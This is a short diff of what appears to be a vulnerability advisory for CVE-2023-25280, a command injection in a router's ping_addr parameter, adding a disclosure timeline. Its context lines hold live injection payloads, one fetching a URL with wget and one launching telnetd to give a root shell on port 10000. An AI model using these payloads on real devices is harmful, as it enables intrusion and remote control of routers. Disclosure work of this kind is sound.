@@ -64,3 +64,9 @@ ccp_act=pingV4Msg&ping_addr=%0awget http://192.168.0.2%0a
 ![poc](poc.png)
 
 Finally, you can write exp, which can achieve a very stable effect of obtaining the root shell，Such as`ping_addr==%0atelnetd -l /bin/sh -p 10000 -b 0.0.0.0%0a`
+
+## Disclosure
+
+- Feb 7, 2023:Public disclosure
+
+- Mar 7, 2023:Assign CVE number CVE-2023-25280
